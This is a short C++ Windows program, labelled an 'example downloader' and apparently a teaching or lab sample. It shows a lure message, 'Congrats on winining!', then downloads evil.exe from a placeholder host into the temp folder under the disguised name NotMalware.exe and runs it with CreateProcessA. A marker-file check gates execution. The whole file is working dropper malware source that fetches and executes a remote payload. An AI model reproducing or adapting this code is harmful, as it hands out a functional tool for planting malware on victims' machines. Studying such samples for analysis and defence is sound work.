#include <urlmon.h>
#include <windows.h>
#include <tchar.h>
#include <wininet.h>
#include <fileapi.h>
#include <shlwapi.h>
#include <iostream>
// Example downloader. 
#define CHONKY_PATH "C:\\malware\\ch0nky.txt"

BOOL FileExists(LPCSTR szPath)
{
  DWORD dwAttrib = GetFileAttributesA(szPath);

  return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}


BOOL ChonkyCheck(){
    return FileExists(CHONKY_PATH);
}

int _tmain(){
    Sleep(5);
    if(!ChonkyCheck()){
        exit(0);
    }
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    auto URL = "http://evilevilevilevilevil.cf/evil.exe";

    auto malName= "NotMalware.exe";
    auto message= "Congrats on winining!";
    std::cout << URL << malName << message << std::endl;
    ::MessageBoxA(NULL, message, message, MB_OK);
    char buffer[MAX_PATH ];
    PathCombineA(buffer, tempPath, malName );
    
    STARTUPINFO si;
	PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    DeleteUrlCacheEntryA(URL);
    //std::wcout << L"Downloading malware to " << buffer << std::endl;
    auto status = URLDownloadToFileA(NULL,URL, buffer, 0 , NULL );
    if (SUCCEEDED(status)){

        /*
                CreateProcessW(
        LPCWSTR               lpApplicationName,
        LPWSTR                lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCWSTR               lpCurrentDirectory,
        LPSTARTUPINFOW        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );
        */

        if (!CreateProcessA(
            nullptr, (LPSTR) buffer, nullptr, nullptr, FALSE, 0, nullptr, nullptr,  &si, &pi)){
        //    std::wcout << GetLastError() << std::endl;
            CloseHandle(pi.hProcess);
       
        }
        

    } else{
    }
    return 0; 
}